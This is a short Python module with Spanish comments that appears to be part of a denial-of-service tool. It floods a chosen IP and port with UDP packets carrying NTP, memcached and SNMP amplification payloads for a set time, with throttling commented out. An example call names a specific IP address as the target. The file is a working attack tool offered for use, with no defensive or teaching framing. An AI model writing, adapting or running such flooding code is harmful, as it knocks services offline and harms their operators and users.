import socket
import time

def run(ip, port, duration, stop_event):
    """
    Envía paquetes UDP usando payloads de amplificación a la IP y puerto especificados por el tiempo dado.

    Args:
        ip (str): IP objetivo.
        port (int): Puerto objetivo.
        duration (int): Duración en segundos.
    """
    ntp_payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
    memcache_payload = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
    snmp_payload = b'\x30\x26\x02\x01\x01\x04\x06public\xa0\x19\x02\x04\x70\xa7\xa7\x7e\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05+\x06\x01\x02\x01\x05\x00'
    payloads = [ntp_payload, memcache_payload, snmp_payload]

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration

    try:
        while time.time() < end_time:
            for payload in payloads:
                sock.sendto(payload, (ip, port))
            # Puedes descomentar la siguiente línea para limitar la velocidad de envío
            # time.sleep(0.001)
    except KeyboardInterrupt:
        print("\nEnvío detenido por el usuario.")
    except Exception as e:
        print(f"[MIX-AMP Error] {e}")
    finally:
        sock.close()

# Ejemplo de uso:
# run("69.30.219.180", 1076, 10)

